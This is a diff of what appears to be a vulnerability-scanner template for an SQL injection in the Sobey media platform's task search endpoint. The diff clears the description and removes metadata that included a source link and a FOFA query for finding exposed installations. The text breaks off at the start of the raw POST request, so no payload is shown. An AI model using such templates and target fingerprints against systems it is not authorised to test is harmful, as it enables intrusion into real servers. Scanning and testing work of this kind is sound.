@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体search存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rkl7bpo17yetywbp'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rkl7bpo17yetywbp
-    fofa: body="/Sc-TaskMonitoring/"
 http:
 - raw:
   - 'POST /Sc-TaskMonitoring/rest/task/search HTTP/1.1
